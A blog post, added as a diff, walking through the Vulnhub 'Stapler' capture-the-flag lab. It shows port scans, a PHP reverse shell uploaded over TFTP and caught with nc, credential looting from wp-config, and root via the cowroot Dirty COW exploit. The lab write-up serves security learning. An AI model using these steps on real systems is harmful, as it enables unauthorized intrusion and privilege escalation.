@@ -1,0 +1,442 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>[Vulnhub] stapler - Walkthrough &middot; M1r4c13</title>
+<meta name="description" content="[Vulnhub] stapler - Walkthrough -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">[Vulnhub] stapler - Walkthrough</h1>
+<p class="meta"><span class="mono meta-date">2017.08.24</span><span class="tags"><span class="chip mono">vulnhub</span><span class="chip mono">ctf</span></span></p>
+<div class="post-body"><p>Vulnhub URI: https://www.vulnhub.com/entry/stapler-1,150/</p>
+<pre><code>Victim: 192.168.56.103
+Attacker: 192.168.56.102
+</code></pre>
+<p>I used the silliest way to root this VM so do not laugh at me...</p>
+<hr>
+<p>First <code>netdiscover -r 192.168.56.0/24</code> to find the victim's IP.<br>
+Then a quick nmap</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/stapler# cat nmap.rst 
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-24 11:49 EDT
+Nmap scan report for 192.168.56.103
+Host is up (-0.0050s latency).
+Not shown: 992 filtered ports
+PORT     STATE  SERVICE
+20/tcp   closed ftp-data
+21/tcp   open   ftp
+22/tcp   open   ssh
+53/tcp   open   domain
+80/tcp   open   http
+139/tcp  open   netbios-ssn
+666/tcp  open   doom
+3306/tcp open   mysql
+MAC Address: 08:00:27:AB:FF:C8 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 37.33 seconds
+</code></pre>
+<p>Several ports are open, checked 80 port first.</p>
+<p><img alt="" src="/blog/images/2017/08/forblog.png"></p>
+<p>It looks like a vulnerable site because it seems just fetch files from the server and return to users.</p>
+<p>nikto didn't return me anything but dirb gives me interesting entries:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/stapler# dirb http://192.168.56.103 /usr/share/wordlists/dirb/big.txt -X ,.php,.js,.html
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Aug 24 15:20:57 2017
+URL_BASE: http://192.168.56.103/
+WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
+EXTENSIONS_LIST: (,.php,.js,.html) | ()(.php)(.js)(.html) [NUM = 4]
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://192.168.56.103/ ----
++ http://192.168.56.103/.bashrc (CODE:200|SIZE:3771)                           
++ http://192.168.56.103/.profile (CODE:200|SIZE:675)                           
+
+(!) FATAL: Too many errors connecting to host
+    (Possible cause: EMPTY REPLY FROM SERVER)
+
+-----------------
+END_TIME: Thu Aug 24 15:21:08 2017
+DOWNLOADED: 9600 - FOUND: 2
+</code></pre>
+<p>Looks like the location of the web content is a home directory. <br>
+I tried ../../../../../etc/passwd, .bash_history, .ssh/know_hosts, but they didn't work which means it is either restricting dir changing or just a trolling page.<br>
+Assume it's the good situation, so if we could find a way to upload a file to here we might be able to get a shell or prove it's a fake page.</p>
+<hr>
+<p>At this time my nmap finished the udp scan. And the result is promising:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/stapler/note# nmap -Pn -sU 192.168.56.103
+
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-24 12:08 EDT
+Stats: 0:10:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 57.19% done; ETC: 12:25 (0:07:19 remaining)
+Nmap scan report for 192.168.56.103
+Host is up (0.00055s latency).
+Not shown: 995 closed ports
+PORT    STATE         SERVICE
+53/udp  open          domain
+68/udp  open|filtered dhcpc
+69/udp  open|filtered tftp
+137/udp open          netbios-ns
+138/udp open|filtered netbios-dgm
+MAC Address: 08:00:27:AB:FF:C8 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1100.98 seconds
+</code></pre>
+<p>Look that! <strong>tftp</strong>!</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/stapler# tftp
+tftp&gt; connect 192.168.56.103
+tftp&gt; get .bashrc
+Received 3888 bytes in 0.0 seconds
+tftp&gt; put shell.php
+Sent 5688 bytes in 0.0 seconds
+tftp&gt; 
+</code></pre>
+<p>Great!<br>
+Looks like the tftp is located at the same directory as the 80 port service, and I can upload a file to that path.</p>
+<p>My shell.php is based on <code>/usr/share/webshells/php/php-reverse-shell.php</code></p>
+<p>Time to receive the shell.</p>
+<p>Go and visit <code>http://192.168.56.103/shell.php</code>, then the shell comes:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/stapler# nc -l -p 9004
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+ 15:35:36 up  2:49,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1028(www) gid=1028(www) groups=1028(www)
+/bin/sh: 0: can't access tty; job control turned off
+$ pwd
+/
+$ cd /home/www
+$ ls -la
+total 72
+drwxrwxrwx  2 www    www      4096 Aug 24 14:50 .
+drwxr-xr-x 32 root   root     4096 Jun  4  2016 ..
+-rw-r--r--  1 www    www       220 Sep  1  2015 .bash_logout
+-rw-r--r--  1 www    www      3771 Sep  1  2015 .bashrc
+-rw-r--r--  1 www    www       675 Sep  1  2015 .profile
+-rw-r--r--  1 nobody nogroup  5496 Aug 24 15:31 shell.php
+</code></pre>
+<hr>
+<p>All right, the privilege escalating part.</p>
+<p>Honestly, my first thought is to exploit overlayfs or use cowroot because of the version is old. But I want to explore more before fire the bullet.</p>
+<p>So I did some recon work.<br>
+<strong>/etc/passwd</strong>:</p>
+<pre><code class="language-bash">root:x:0:0:root:/root:/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+messagebus:x:108:111::/var/run/dbus:/bin/false
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
+mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
+RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
+ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
+DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
+AParnell:x:1004:1004::/home/AParnell:/bin/bash
+SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
+MBassin:x:1006:1006::/home/MBassin:/bin/bash
+JBare:x:1007:1007::/home/JBare:/bin/bash
+LSolum:x:1008:1008::/home/LSolum:/bin/bash
+IChadwick:x:1009:1009::/home/IChadwick:/bin/false
+MFrei:x:1010:1010::/home/MFrei:/bin/bash
+SStroud:x:1011:1011::/home/SStroud:/bin/bash
+CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
+JKanode:x:1013:1013::/home/JKanode:/bin/bash
+CJoo:x:1014:1014::/home/CJoo:/bin/bash
+Eeth:x:1015:1015::/home/Eeth:/usr/sbin/nologin
+LSolum2:x:1016:1016::/home/LSolum2:/usr/sbin/nologin
+JLipps:x:1017:1017::/home/JLipps:/bin/sh
+jamie:x:1018:1018::/home/jamie:/bin/sh
+Sam:x:1019:1019::/home/Sam:/bin/zsh
+Drew:x:1020:1020::/home/Drew:/bin/bash
+jess:x:1021:1021::/home/jess:/bin/bash
+SHAY:x:1022:1022::/home/SHAY:/bin/bash
+Taylor:x:1023:1023::/home/Taylor:/bin/sh
+mel:x:1024:1024::/home/mel:/bin/bash
+kai:x:1025:1025::/home/kai:/bin/sh
+zoe:x:1026:1026::/home/zoe:/bin/bash
+NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
+www:x:1028:1028::/home/www:
+postfix:x:112:118::/var/spool/postfix:/bin/false
+ftp:x:110:116:ftp daemon,,,:/var/ftp:/bin/false
+elly:x:1029:1029::/home/elly:/bin/bash
+</code></pre>
+<p>And I checked all of there home directory but no one has any interesting files.<br>
+<strong>netstat</strong>:</p>
+<pre><code class="language-bash">$ netstat -nplt
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1434/php        
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:666             0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::139                  :::*                    LISTEN      -               
+tcp6       0      0 :::53                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+tcp6       0      0 :::12380                :::*                    LISTEN      -               
+tcp6       0      0 :::12380                :::*                    LISTEN      -               
+tcp6       0      0 :::12380                :::*                    LISTEN      -               
+tcp6       0      0 :::445                  :::*                    LISTEN      -               
+</code></pre>
+<p><strong>/var/www/</strong>:</p>
+<pre><code class="language-bash">$ pwd
+/var/www/https
+$ ls -la
+total 460
+drwxr-xr-x 5 root root   4096 Jun  5  2016 .
+drwxr-xr-x 3 root root   4096 Jun  6  2016 ..
+drwxr-xr-x 2 root root   4096 Jun  3  2016 admin112233
+drwxr-xr-x 2 root root   4096 Jun  4  2016 announcements
+drwxr-xr-x 5 root root   4096 Jun  4  2016 blogblog
+-rw-r--r-- 1 root root 434538 Jun  3  2016 custom_400.html
+-rw-r--r-- 1 root root     92 Jun  4  2016 .htaccess
+-rw-r--r-- 1 root root     21 Jun  5  2016 index.html
+-rw-r--r-- 1 root root     59 Jun  3  2016 robots.txt
+$ cat robots.txt
+User-agent: *
+Disallow: /admin112233/
+Disallow: /blogblog/
+</code></pre>
+<p>Here I found something, like the credentials for mysql.</p>
+<pre><code class="language-bash">$ cd blogblog
+$ ls
+index.php
+license.txt
+readme.html
+wordpress-4.2.1.tar.gz
+wp-activate.php
+wp-admin
+wp-blog-header.php
+wp-comments-post.php
+wp-config.php
+wp-config-sample.php
+wp-content
+wp-cron.php
+wp-includes
+wp-links-opml.php
+wp-load.php
+wp-login.php
+wp-mail.php
+wp-settings.php
+wp-signup.php
+wp-trackback.php
+xmlrpc.php
+$ cat wp-config.php | grep DB_
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'plbkac');
+define('DB_HOST', 'localhost');
+define('DB_CHARSET', 'utf8mb4');
+define('DB_COLLATE', '');
+$ 
+</code></pre>
+<p>So login to mysql:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/stapler# mysql -h 192.168.56.103 -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 11
+Server version: 5.7.12-0ubuntu1 (Ubuntu)
+
+Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| loot               |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| proof              |
+| sys                |
+| wordpress          |
++--------------------+
+8 rows in set (0.00 sec)
+</code></pre>
+<p>There are many password and usernames inside those dbs, but I'm not sure which are for ssh.<br>
+At this point, I back to the reverse shell and tried to follow the traditional way:</p>
+<pre><code class="language-bash">$ find / -xdev -perm /6000 \( -user root -o -group root \) 2&gt;/dev/null
+/var/mail
+/var/local
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/expiry
+/usr/bin/newgidmap
+/usr/bin/ssh-agent
+/usr/bin/chage
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/wall
+/usr/bin/crontab
+/usr/bin/gpasswd
+/usr/bin/ubuntu-core-launcher
+/usr/bin/screen
+/usr/local/share/fonts
+/usr/local/share/zsh/site-functions
+/usr/local/share/sgml
+/usr/local/share/sgml/dtd
+/usr/local/share/sgml/entities
+/usr/local/share/sgml/misc
+/usr/local/share/sgml/declaration
+/usr/local/share/sgml/stylesheet
+/usr/local/share/xml
+/usr/local/share/xml/schema
+/usr/local/share/xml/entities
+/usr/local/share/xml/misc
+/usr/local/share/xml/declaration
+/usr/local/lib/python3.5
+/usr/local/lib/python3.5/dist-packages
+/usr/local/lib/python2.7
+/usr/local/lib/python2.7/dist-packages
+/usr/local/lib/python2.7/site-packages
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
+/usr/lib/i386-linux-gnu/utempter/utempter
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/authbind/helper
+/usr/sbin/postqueue
+/usr/sbin/postdrop
+/bin/mount
+/bin/umount
+/bin/ping
+/bin/fusermount
+/bin/ping6
+/bin/su
+/sbin/unix_chkpwd
+/sbin/pam_extrausers_chkpwd
+</code></pre>
+<p>Here I saw two files: postqueue and postdrop. Googled it, turns out they are belong to postfix service which showed up in /etc/passwd.<br>
+Searched for it's exploitation and I found one, https://www.exploit-db.com/exploits/6337/<br>
+But it didn't work because I do not have write permission to /var/mail:</p>
+<pre><code class="language-bash">$ ./epl.sh
+#
+# &quot;rs_pocfix.sh&quot; (PoC for Postfix local root vulnerability: CVE-2008-2936)
+# by Roman Medina-Heigl Hernandez a.k.a. RoMaNSoFt &lt;roman@rs-labs.com&gt;
+#
+# Tested: Ubuntu / Debian
+#
+# [ Madrid, 30.Aug.2008 ]
+#
+[*] Postfix seems to be installed
+[*] Hardlink to symlink not dereferenced
+[!] Spool dir is not writable
+</code></pre>
+<p>And that dir is belong to www-data but I was login as www.</p>
+<pre><code class="language-bash">$ ls -l /var/mail     
+total 48
+-rw-r--r-- 1 root     mail     1 Jun  4  2016 root
+-rw------- 1 www-data mail 39991 Jun  5  2016 www-data
+$ whoami
+www
+</code></pre>
+<p>All I need is data :D<br>
+So I was wondering if I can start some web service and get the reverse shell of www-data then use this exploitation.<br>
+Or, if I found a way to ssh in as another user maybe there another way waiting for me.</p>
+<p>So I start to try those kernel exploitation at this point. :D<br>
+First I tried overlayfs but it's not vulnerable, then I tried cowroot and then I back to mysql to search for more information without check the result (I though it was stuck! seriously)</p>
+<p>I did find many hashed passwords and messages inside the db but I can't decrypt them with john in the short time.</p>
+<p>When I decoding those passwords, I back to the 'stuck' reverse shell and type something:</p>
+<pre><code class="language-bash">$ ./cowroot
+whoami
+root
+cd /root
+ls
+fix-wordpress.sh
+flag.txt
+issue
+python.sh
+wordpress.sql
+cat flag.txt
+~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`&quot;-.         |       |
+ .-O o `&quot;-.o   O )_,._    |       |
+( o   O  o )--.-&quot;`O   o&quot;-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+</code></pre>
+<p>Oh my. Happiness came without being prepared. </p>
+<hr>
+<p><strong>other things</strong></p>
+<p>Oh besides, I've also tried other ports.<br>
+from 666 port I got a message2.jpg, which looks like this:<br>
+<img alt="" src="/blog/images/2017/08/forblog-1.png"><br>
+And also:</p>
+<pre><code class="language-bash">root@kali:~/vulnerhub/stapler/message# steghide --info message2.jpg 
+&quot;message2.jpg&quot;:
+  format: jpeg
+  capacity: 318.0 Byte
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+steghide: could not extract any data with that passphrase!
+</code></pre>
+<p>I didn't figure out the password yet.</p>
+<p><strong>(please check the previous part for root and flag)</strong></p>
+<hr>
+<p>Again, dirtycow is really powerful.</p>
+<p>There are other ways to get reverse shell and root it, I believe other ways are more interesting.</p>
+<p>Thanks g0tmi1k for providing this good practise.</p></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
